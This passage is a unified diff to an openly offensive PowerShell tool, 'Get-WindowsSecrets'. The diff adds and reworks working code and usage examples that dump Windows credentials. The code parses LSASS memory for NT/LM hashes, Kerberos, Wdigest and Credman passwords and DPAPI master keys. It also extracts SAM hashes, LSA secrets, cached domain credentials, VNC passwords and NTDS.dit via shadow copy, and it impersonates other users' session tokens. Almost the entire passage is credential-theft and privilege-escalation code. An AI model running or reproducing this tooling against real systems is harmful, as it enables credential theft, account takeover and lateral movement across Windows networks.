+			If ($LogonSession["UserName"]) { Write-Host ("`t[+] UserName = {0}" -f ($LogonSession["UserName"])) } Else { Write-Host "`t[+] UserName = None" }
+			If ($LogonSession["Domain"]) { Write-Host ("`t[+] Domain = {0}" -f ($LogonSession["Domain"])) } Else { Write-Host "`t[+] Domain = None" }
+			If ($LogonSession["LogonServer"]) { Write-Host ("`t[+] Logon Server = {0}" -f ($LogonSession["LogonServer"])) } Else { Write-Host "`t[+] Logon Server = None" }
+			If ($LogonSession["LogonTime"]) { Write-Host ("`t[+] Logon Time = {0}" -f ($LogonSession["LogonTime"])) } Else { Write-Host "`t[+] Logon Time = None" }
+			If ($LogonSession["SID"]) { Write-Host ("`t[+] SID = {0}" -f ($LogonSession["SID"])) } Else { Write-Host "`t[+] SID = None" }
+			If ($LogonSession["LUID"]) { Write-Host ("`t[+] LUID = {0}" -f ($LogonSession["LUID"])) } Else { Write-Host "`t[+] LUID = None" }
 
 			$MSVNb = 1
 			ForEach ($MSVCred in $LogonSession["MSV_Creds"])
@@ -10254,11 +11019,11 @@ function Parse-LSASS($Dump)
 				Write-Host ("`t`t*** MSV Credential {0} ***" -f ($MSVNb))
 				$MSVNb += 1
 
-				If ($MSVCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($MSVCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($MSVCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($MSVCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($MSVCred["LMHash"]) { Write-Host ("`t`tLM = {0}" -f ([System.BitConverter]::ToString($MSVCred["LMHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tLM = None") }
-				If ($MSVCred["NTHash"]) { Write-Host ("`t`tNT = {0}" -f ([System.BitConverter]::ToString($MSVCred["NTHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tNT = None") }
-				If ($MSVCred["SHAHash"]) { Write-Host ("`t`tSHA1 = {0}" -f ([System.BitConverter]::ToString($MSVCred["SHAHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tSHA1 = None") }
+				If ($MSVCred["UserName"]) { Write-Host ("`t`t[+] UserName = {0}" -f ($MSVCred["UserName"])) } Else { Write-Host ("`t`t[+] UserName = None") }
+				If ($MSVCred["Domain"]) { Write-Host ("`t`t[+] Domain = {0}" -f ($MSVCred["Domain"])) } Else { Write-Host ("`t`t[+] Domain = None") }
+				If ($MSVCred["LMHash"]) { Write-Host ("`t`t[+] LM = {0}" -f ([System.BitConverter]::ToString($MSVCred["LMHash"]).Replace("-", ""))) } Else { Write-Host ("`t`t[+] LM = None") }
+				If ($MSVCred["NTHash"]) { Write-Host ("`t`t[+] NT = {0}" -f ([System.BitConverter]::ToString($MSVCred["NTHash"]).Replace("-", ""))) } Else { Write-Host ("`t`t[+] NT = None") }
+				If ($MSVCred["SHAHash"]) { Write-Host ("`t`t[+] SHA1 = {0}" -f ([System.BitConverter]::ToString($MSVCred["SHAHash"]).Replace("-", ""))) } Else { Write-Host ("`t`t[+] SHA1 = None") }
 				If ($MSVCred["DPAPI"])
 				{
 					If (@(Compare-Object $MSVCred["DPAPI"] (New-Object byte[] 16) -SyncWindow 0).Length -ne 0) { Write-Host ("`t`tDPAPI = {0}" -f ([System.BitConverter]::ToString($MSVCred["DPAPI"]).Replace("-", ""))) } Else { Write-Host ("`t`tDPAPI = None") }
@@ -10271,9 +11036,9 @@ function Parse-LSASS($Dump)
 				Write-Host ("`t`t*** Credman Credential {0} ***" -f ($CredmanNb))
 				$CredmanNb += 1
 
-				If ($CredmanCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($CredmanCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($CredmanCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($CredmanCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($CredmanCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($CredmanCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
+				If ($CredmanCred["UserName"]) { Write-Host ("`t`t[+] UserName = {0}" -f ($CredmanCred["UserName"])) } Else { Write-Host ("`t`t[+] UserName = None") }
+				If ($CredmanCred["Domain"]) { Write-Host ("`t`t[+] Domain = {0}" -f ($CredmanCred["Domain"])) } Else { Write-Host ("`t`t[+] Domain = None") }
+				If ($CredmanCred["Password"]) { Write-Host ("`t`t[+] Hex Pwd = {0}" -f ([System.BitConverter]::ToString($CredmanCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`t[+] Hex Pwd = None") }
 			}
 
 			$WdigestNb = 1
@@ -10282,9 +11047,9 @@ function Parse-LSASS($Dump)
 				Write-Host ("`t`t*** Wdigest Credential {0} ***" -f ($WdigestNb))
 				$WdigestNb += 1
 
-				If ($WdigestCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($WdigestCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($WdigestCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($WdigestCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($WdigestCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($WdigestCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
+				If ($WdigestCred["UserName"]) { Write-Host ("`t`t[+] UserName = {0}" -f ($WdigestCred["UserName"])) } Else { Write-Host ("`t`t[+] UserName = None") }
+				If ($WdigestCred["Domain"]) { Write-Host ("`t`t[+] Domain = {0}" -f ($WdigestCred["Domain"])) } Else { Write-Host ("`t`t[+] Domain = None") }
+				If ($WdigestCred["Password"]) { Write-Host ("`t`t[+] Hex Pwd = {0}" -f ([System.BitConverter]::ToString($WdigestCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`t[+] Hex Pwd = None") }
 			}
 
 			$KerberosNb = 1
@@ -10293,9 +11058,9 @@ function Parse-LSASS($Dump)
 				Write-Host ("`t`t*** Kerberos Credential {0} ***" -f ($KerberosNb))
 				$KerberosNb += 1
 
-				If ($KerberosCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($KerberosCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($KerberosCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($KerberosCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($KerberosCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($KerberosCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
+				If ($KerberosCred["UserName"]) { Write-Host ("`t`t[+] UserName = {0}" -f ($KerberosCred["UserName"])) } Else { Write-Host ("`t`t[+] UserName = None") }
+				If ($KerberosCred["Domain"]) { Write-Host ("`t`t[+] Domain = {0}" -f ($KerberosCred["Domain"])) } Else { Write-Host ("`t`t[+] Domain = None") }
+				If ($KerberosCred["Password"]) { Write-Host ("`t`t[+] Hex Pwd = {0}" -f ([System.BitConverter]::ToString($KerberosCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`t[+] Hex Pwd = None") }
 			}
 
 			$DPAPINb = 1
@@ -10304,9 +11069,9 @@ function Parse-LSASS($Dump)
 				Write-Host ("`t`t*** DPAPI Credential {0} ***" -f ($DPAPINb))
 				$DPAPINb += 1
 
-				Write-Host ("`t`tMasterKey GUID = {0}" -f ($DPAPICred["Key_GUID"]))
-				Write-Host ("`t`tMasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["MasterKey"]).Replace("-", "")))
-				Write-Host ("`t`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["SHA1_MasterKey"]).Replace("-", "")))
+				Write-Host ("`t`t[+] MasterKey GUID = {0}" -f ($DPAPICred["Key_GUID"]))
+				Write-Host ("`t`t[+] MasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["MasterKey"]).Replace("-", "")))
+				Write-Host ("`t`t[+] SHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["SHA1_MasterKey"]).Replace("-", "")))
 			}
 		}
 	}
@@ -10319,7 +11084,7 @@ function Parse-LSASS($Dump)
 	{
 		ForEach ($OrphanedCred in $OrphanedCreds)
 		{
-			Write-Host ("[...] Orphaned Credential {0}" -f ($OrphanedCredsNb))
+			Write-Host ("[+] Orphaned Credential {0}" -f ($OrphanedCredsNb))
 			$OrphanedCredsNb += 1
 
 			Switch ($OrphanedCred["CredType"])
@@ -10328,25 +11093,25 @@ function Parse-LSASS($Dump)
 				{
 					Write-Host ("`t*** Wdigest Credential ***")
 
-					If ($OrphanedCred["UserName"]) { Write-Host ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`tUserName = None") }
-					If ($OrphanedCred["Domain"]) { Write-Host ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`tDomain = None") }
-					If ($OrphanedCred["Password"]) { Write-Host ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`tHex Pwd = None") }
+					If ($OrphanedCred["UserName"]) { Write-Host ("`t[+] UserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`t[+] UserName = None") }
+					If ($OrphanedCred["Domain"]) { Write-Host ("`t[+] Domain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`t[+] Domain = None") }
+					If ($OrphanedCred["Password"]) { Write-Host ("`t[+] Hex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t[+] Hex Pwd = None") }
 				}
 				"Kerberos"
 				{
 					Write-Host ("`t*** Kerberos Credential ***")
 
-					If ($OrphanedCred["UserName"]) { Write-Host ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`tUserName = None") }
-					If ($OrphanedCred["Domain"]) { Write-Host ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`tDomain = None") }
-					If ($OrphanedCred["Password"]) { Write-Host ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`tHex Pwd = None") }
+					If ($OrphanedCred["UserName"]) { Write-Host ("`t[+] UserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`t[+] UserName = None") }
+					If ($OrphanedCred["Domain"]) { Write-Host ("`t[+] Domain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`t[+] Domain = None") }
+					If ($OrphanedCred["Password"]) { Write-Host ("`t[+] Hex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t[+] Hex Pwd = None") }
 				}
 				"DPAPI"
 				{
 					Write-Host ("`t*** DPAPI Credential ***" -f ($DPAPINb))
 
-					Write-Host ("`tMasterKey GUID = {0}" -f ($OrphanedCred["Key_GUID"]))
-					Write-Host ("`tMasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["MasterKey"]).Replace("-", "")))
-					Write-Host ("`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["SHA1_MasterKey"]).Replace("-", "")))
+					Write-Host ("`t[+] MasterKey GUID = {0}" -f ($OrphanedCred["Key_GUID"]))
+					Write-Host ("`t[+] MasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["MasterKey"]).Replace("-", "")))
+					Write-Host ("`t[+] SHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["SHA1_MasterKey"]).Replace("-", "")))
 				}
 			}
 		}
@@ -10360,7 +11125,14 @@ function Parse-LSASS($Dump)
 #>
 function Get-LSASS($Method)
 {
-	Write-Host ("`n[===] Get LSASS secrets using {0} method [===]" -f ($Method))
+	$CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+	If (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+	{
+		Write-Host ("[ERROR] Script must be run with administrator privileges. Exit`n")
+		Exit
+	}
+
+	Write-Host ("[===] Get LSASS secrets using {0} method [===]" -f ($Method))
 
 	$Dump = Dump-LSASS($Method)
 	If ($Dump)
@@ -10551,10 +11323,12 @@ function Get-LSASS($Method)
 			}
 		}
 
+		Write-Host ""
 		return ($Pwds, $NTHs, $MasterKeys)
 	}
 	Else
 	{
+		Write-Host ""
 		return $Null
 	}
 }
@@ -10563,54 +11337,254 @@ function Get-LSASS($Method)
 <# MAIN #>
 <########>
 
+<#
+.SYNOPSIS
+    Recover Windows Secrets
+
+.DESCRIPTION
+    SAM, LSA Secrets, Cached Domain Creds, DPAPI Secrets, VNC pwds, NTDS.dit, LSASS, Session Tokens
+
+.PARAMETER SAM
+    Dump SAM (LM/NT Hashes)
+.PARAMETER LSA
+    Dump LSA Secrets ($MACHINE.ACC, DefaultPassword, NL$KM, DPAPI_SYSTEM, _SC_<ServiceName>, ASPNET_WP_PASSWORD, L$_SQSAA_S-<SID>, etc.)
+.PARAMETER CachedDomainCreds
+	Dump Cached Domain Credentials (MsCash hashes)
+.PARAMETER DPAPI
+	Dump DPAPI Secrets
+.PARAMETER SkipLSASS
+	Do not search into LSASS Pwdds, NT Hashes and MasterKeys for DPAPI
+.PARAMETER VNC
+	Dump VNC pwds (TightVNC, UltraVNC, TigerVNC, RealVNC)
+.PARAMETER NTDS
+	Dump NTDS.dit (LM/NT Hashes)
+.PARAMETER LSASS
+	Dump LSASS Secrets (MSV Secrets, Credman Secrets, WDigest Secrets, Kerberos Secrets, DPAPI Secrets, Cloudap Secrets, LiveSSP Secrets, SSP Secrets, TSPKG Secrets)
+.PARAMETER SessionTokens
+	List Session Tokens (ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:ImpersonationLevel:LogonType:IsElevatedToken:TokenElevationType) with their privileges
+.PARAMETER ActivatePrivilege
+	Allow to enable the provided privilege name. The privilege have to be in your current set
+.PARAMETER Creds
+	Credentials with format <UserName1>:<Pwd1>/<UserName2>@<Domain>:<Pwd2>/... (Can help for DPAPI)
+.PARAMETER NTHashes
+	NT Hashes with format <UserName1>:<HexNT1>/<UserName2>@<Domain>:<HexNT2>/... (Can help for DPAPI)
+.PARAMETER Impersonate
+	Impersonate Session Token
+.PARAMETER TokenProcID
+	Process ID to impersonate Session Token
+.PARAMETER ImpersonateMethod
+	Method to impersonate Session Token from "ImpersonateLoggedOnUser" | "CreateProcessWithToken" | "CreateProcessAsUser"
+.PARAMETER Command
+	For CreateProcessAsUser: Run a command to the token pipe rather than using a pseudo-interactive shell
+
+.EXAMPLE
+    Get-WindowsSecrets -SAM
+.EXAMPLE
+	Get-WindowsSecrets -LSA
+.EXAMPLE
+	Get-WindowsSecrets -CachedDomainCreds
+.EXAMPLE
+	Get-WindowsSecrets -VNC
+.EXAMPLE
+	Get-WindowsSecrets -NTDS
+.EXAMPLE
+	Get-WindowsSecrets -SessionTokens
+.EXAMPLE
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod ImpersonateLoggedOnUser
+.EXAMPLE
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod CreateProcessWithToken
+.EXAMPLE
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod CreateProcessAsUser
+.EXAMPLE
+	Get-WindowsSecrets -Impersonate -TokenProcID 1528 -ImpersonateMethod CreateProcessAsUser -Command "whoami"
+.EXAMPLE
+	Get-WindowsSecrets -LSASS
+.EXAMPLE
+	Get-WindowsSecrets -DPAPI
+.EXAMPLE
+	Get-WindowsSecrets -DPAPI -Creds User1:Pwd1/User2@Domain:Pwd2 -NTHashes User1:HexNTHash1/User2@Domain:HexNTHash2
+.EXAMPLE
+	Get-WindowsSecrets -DPAPI -Creds User1:Pwd1/User2@Domain:Pwd2 -NTHashes User1:HexNTHash1/User2@Domain:HexNTHash2 -SkipLSASS
+#>
 function Get-WindowsSecrets()
 {
 	<#
 		Get-WindowsSecrets: Call to functions to get Windows Secrets (BootKey, SAM, LSA Secrets, Cached Domain Creds, DPAPI Secrets, VNC pwds, NTDS.dit, LSASS, Session Tokens)
-			- For DPAPI Secrets, It is very slow for MasterKeys decryption, you can skip with -SkipDPAPI parameter
+			- For DPAPI Secrets, It is very slow for MasterKeys decryption
 	#>
 	Param(
-		[Parameter(Mandatory=$False)][String]$Creds,	# Format = <UserName1>:<Pwd1>/<UserName2>@<Domain>:<Pwd2>/...
-		[Parameter(Mandatory=$False)][String]$NTHashes,	# Format = <UserName1>:<HexNTH1>/<UserName2>@<Domain>:<HexNTH2>/...
-		[Parameter(Mandatory=$False)][Boolean]$SkipDPAPI,
-		[Parameter(Mandatory=$False)][String]$ImpersonateTokenProcID, # Format = <ProcID>
-		[Parameter(Mandatory=$False)][String]$ImpersonateMethod, # Possible values = "ImpersonateLoggedOnUser" | "CreateProcessWithToken" | "CreateProcessAsUser"
-		[Parameter(Mandatory=$False)][String]$ImpersonateIsSystem, # Format = "True"/"False",
-		[Parameter(Mandatory=$False)][String]$ImpersonateConnectTokenPipe, # Format = "True"/"False"
-		[Parameter(Mandatory=$False)][String]$ImpersonateCommand # Format = "Null"/<CmdToExecute>
+		[Parameter(Mandatory=$False)][Switch]$SAM,
+		[Parameter(Mandatory=$False)][Switch]$LSA,
+		[Parameter(Mandatory=$False)][Switch]$CachedDomainCreds,
+		[Parameter(Mandatory=$False)][Switch]$VNC,
+		[Parameter(Mandatory=$False)][Switch]$NTDS,
+		[Parameter(Mandatory=$False)][Switch]$LSASS,
+
+		[Parameter(Mandatory=$False)][Switch]$DPAPI,
+		[Parameter(Mandatory=$False)][String]$Creds,
+		[Parameter(Mandatory=$False)][String]$NTHashes,
+		[Parameter(Mandatory=$False)][Switch]$SkipLSASS,
+		
+		[Parameter(Mandatory=$False)][Switch]$SessionTokens,
+		[Parameter(Mandatory=$False)][String]$ActivatePrivilege,
+		[Parameter(Mandatory=$False)][Switch]$Impersonate,
+		[Parameter(Mandatory=$False)][Int]$TokenProcID,
+		[Parameter(Mandatory=$False)][String]$ImpersonateMethod,
+		[Parameter(Mandatory=$False)][String]$Command
 		)
 
-	# Check administrator privileges, otherwise exit
-	$CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-	If (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+	# TODO
+	# Test LSA Secrets for services
+	# Implement DPAPI decryption with Domain Backup Master Key
+
+	Write-Host ""
+
+	If (-not $SAM -and -not $LSA -and -not $CachedDomainCreds -and -not $VNC -and -not $NTDS -and -not $SessionTokens -and -not $ActivatePrivilege -and -not $Impersonate -and -not $LSASS -and -not $DPAPI)
 	{
-		Write-Host ("`n[ERROR] Script must be run with administrator privileges. Exit`n")
-		Exit
+		Write-Host ("[ERROR] No action requested. Check help with 'Get-Help -Name Get-WindowsSecrets'`n")
 	}
 
-	If ($ImpersonateTokenProcID)
+	# SAM
+	If ($SAM)
 	{
-
-		ImpersonateToken -ProcID $ImpersonateTokenProcID -Method $ImpersonateMethod -IsSystem $ImpersonateIsSystem -ConnectTokenPipe $ImpersonateConnectTokenPipe -ImpersonateCommand $ImpersonateCommand
-		return
+		$BootKey = Get-BootKey
+		$SecurityAccountManager = Get-SAM $BootKey
 	}
 
-	$Tokens = ListSessionTokens
-
-	$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"
-
-	$BootKey = Get-BootKey
-	$SAM = Get-SAM $BootKey
-
-	$LSASecretKey = Get-LSASecretKey $BootKey
-	$LSASecrets = Get-LSASecrets $LSASecretKey
-
-	$NLKM = $LSASecrets['NL$KM']["CurrVal"]
-	$CachedDomainCreds = Get-CachedDomainCreds $NLKM
-
-	If (-not ($SkipDPAPI))
+	# LSA Secrets
+	If ($LSA)
 	{
-		# Get potential Pwds/NT Hashes from parameters for DPAPI PreKeys
+		If (-not $BootKey)
+		{
+			$BootKey = Get-BootKey
+		}
+		$LSASecretKey = Get-LSASecretKey $BootKey
+		If ($LSASecretKey)
+		{
+			$LSASecrets = Get-LSASecrets $LSASecretKey
+		}
+		Else
+		{
+			return
+		}
+	}
+
+	# Cached Domain Credentials
+	If ($CachedDomainCreds)
+	{
+		If (-not $BootKey)
+		{
+			$BootKey = Get-BootKey
+		}
+		If (-not $LSASecrets)
+		{
+			$LSASecretKey = Get-LSASecretKey $BootKey
+			If ($LSASecretKey)
+			{
+				$LSASecrets = Get-LSASecrets $LSASecretKey
+			}
+			Else
+			{
+				return
+			}
+		}
+
+		$NLKM = $LSASecrets['NL$KM']["CurrVal"]
+		$CachedDomainCredentials = Get-CachedDomainCreds $NLKM
+	}
+
+	# VNC
+	If ($VNC)
+	{
+		Get-VNCPwds
+	}
+
+	# NTDS
+	If ($NTDS)
+	{
+		If (-not $BootKey)
+		{
+			$BootKey = Get-BootKey
+		}
+		$Users = Get-NTDS -Method "Shadow Copy" $BootKey
+	}
+
+	# Session Tokens
+	If ($SessionTokens)
+	{
+		$Tokens = ListSessionTokens
+	}
+
+	If ($ActivatePrivilege)
+	{
+		Write-Host ("[===] Enabling a privilege [===]")
+		$RetCode = EnablePrivilege $ActivatePrivilege
+		If ($RetCode -ne 0)
+		{
+			Write-Host ("[-] Failed to enable $ActivatePrivilege with error {0}`n" -f ($RetCode))
+		}
+		Else
+		{
+			Write-Host ("[+] $ActivatePrivilege successfully enabled`n")
+		}
+	}
+
+	# Impersonate Session Tokens
+	If ($Impersonate)
+	{
+		If ((-not $TokenProcID) -or (-not $ImpersonateMethod))
+		{
+			Write-Host ("[-] You must provide TokenProcID and ImpersonateMethod parameters`n")
+			return
+		}
+
+		If ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18")
+		{
+			ImpersonateToken -ProcID $TokenProcID -Method $ImpersonateMethod -IsSystem -ImpersonateCommand $Command
+		}
+		Else
+		{
+			ImpersonateToken -ProcID $TokenProcID -Method $ImpersonateMethod -ImpersonateCommand $Command
+		}
+	}
+
+	# LSASS
+	If ($LSASS)
+	{
+		$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"
+		$LSASSDumped = $True
+	}
+
+	# DPAPI Secrets: Try to get first LSA Secrets (for DPAPI System PreKeys), LSASS (for unencrypted Masterkeys), Pwds/NT Hashes passed in parameters (to compute DPAPI User PreKeys) If not already done
+	If ($DPAPI)
+	{
+		If (-not $BootKey)
+		{
+			$BootKey = Get-BootKey
+		}
+		If (-not $SecurityAccountManager)
+		{
+			$SecurityAccountManager = Get-SAM $BootKey
+		}
+		If (-not $LSASecrets)
+		{
+			$LSASecretKey = Get-LSASecretKey $BootKey
+			If ($LSASecretKey)
+			{
+				$LSASecrets = Get-LSASecrets $LSASecretKey
+			}
+			Else
+			{
+				return
+			}
+		}
+
+		If (-not $SkipLSASS -and -not $LSASSDumped)
+		{
+			$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"
+		}
+
+		# Get potential Pwds from parameters for DPAPI User PreKeys
 		If ($Creds)
 		{
 			If (-not $Pwds) { $Pwds = @{} }
@@ -10659,6 +11633,7 @@ function Get-WindowsSecrets()
 			}
 		}
 
+		# Get potential NT Hashes from parameters for DPAPI User PreKeys
 		If ($NTHashes)
 		{
 			If (-not $NTHs) { $NTHs = @{} }
@@ -10708,12 +11683,7 @@ function Get-WindowsSecrets()
 		}
 
 		$LSA_DPAPI_SYSTEM = $LSASecrets["DPAPI_SYSTEM"]["CurrVal"]
-		$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SAM $Pwds $NTHs $MasterKeys
+		$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SecurityAccountManager $Pwds $NTHs $MasterKeys
 		Get-DPAPISecrets $MasterKeys
 	}
-
-	Get-VNCPwds
-	$Users = Get-NTDS -Method "Shadow Copy" $BootKey
-
-	Write-Host ""
 }
